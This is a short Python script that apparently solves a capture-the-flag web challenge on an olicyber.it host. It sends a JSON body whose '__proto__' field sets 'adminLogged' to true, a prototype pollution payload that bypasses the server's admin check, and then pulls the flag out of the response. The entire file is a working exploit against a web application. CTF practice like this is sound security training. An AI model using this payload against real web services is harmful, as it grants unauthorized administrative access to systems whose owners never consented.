import requests, re

reg = r'flag{.*?}'
site = "http://hi-admin.challs.olicyber.it/hi"
payload = { # prototye pollution
    "name":"bosio",
    "__proto__":{
        "adminLogged":True
    }
}
r = requests.post(site, json=payload)
print(re.findall(reg, r.text)[0])